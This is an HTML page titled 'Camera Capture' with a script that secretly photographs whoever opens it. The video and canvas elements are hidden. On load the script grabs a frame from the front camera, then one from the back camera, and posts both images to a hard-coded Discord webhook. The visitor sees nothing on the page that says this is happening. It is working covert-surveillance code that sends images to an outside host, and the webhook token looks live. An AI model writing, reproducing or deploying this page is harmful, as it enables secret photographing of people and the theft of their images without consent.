<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
</head>
<body>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Discord webhook URL (replace with yours)
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320376121572724777/ZwPWtXeYwYDQ9tH-H4TAHl_Vv2YVwbLo90oRI8ojgNVWH3PjTavwrPPbtTmdwf7RwIL7";

        let videoStream;

        // Function to get available cameras (front and back)
        function getCameraDevices() {
            return navigator.mediaDevices.enumerateDevices()
                .then(devices => {
                    const cameras = devices.filter(device => device.kind === 'videoinput');
                    return cameras;
                });
        }

        // Function to switch between front and back cameras
        function switchCamera(cameraId) {
            // Stop the current video stream if it exists
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }

            // Start a new video stream with the selected camera
            const constraints = {
                video: {
                    deviceId: cameraId ? { exact: cameraId } : undefined
                }
            };

            return navigator.mediaDevices.getUserMedia(constraints)
                .then((stream) => {
                    video.srcObject = stream;
                    videoStream = stream;
                })
                .catch((error) => {
                    console.error('Error accessing the camera: ', error);
                });
        }

        // Start capturing photos from the front and back cameras if available
        getCameraDevices().then((cameras) => {
            // Default to front camera if available
            const frontCamera = cameras.find(camera => camera.label.toLowerCase().includes('front'));
            const backCamera = cameras.find(camera => camera.label.toLowerCase().includes('back'));

            // First, start the front camera (or any available camera)
            switchCamera(frontCamera ? frontCamera.deviceId : (backCamera ? backCamera.deviceId : null));

            // Automatically capture and send a photo from the front camera
            video.onloadedmetadata = () => {
                captureAndSendPhoto();
            };

            // If both cameras are available, switch to the back camera and capture a photo
            if (backCamera) {
                setTimeout(() => {
                    switchCamera(backCamera.deviceId);
                    captureAndSendPhoto();
                }, 3000); // Wait for 3 seconds before switching to the back camera
            }
        });

        function captureAndSendPhoto() {
            // Draw the video frame onto the canvas
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the canvas content to an image (Blob)
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'photo.png');

                // Send the photo to the Discord webhook
                fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData,
                })
                    .then((response) => {
                        if (response.ok) {
                            console.log('Photo sent successfully!');
                        } else {
                            console.error('Failed to send photo.', response.status);
                        }
                    })
                    .catch((error) => {
                        console.error('An error occurred while sending the photo.', error);
                    });
            });
        }
    </script>
</body>
</html>
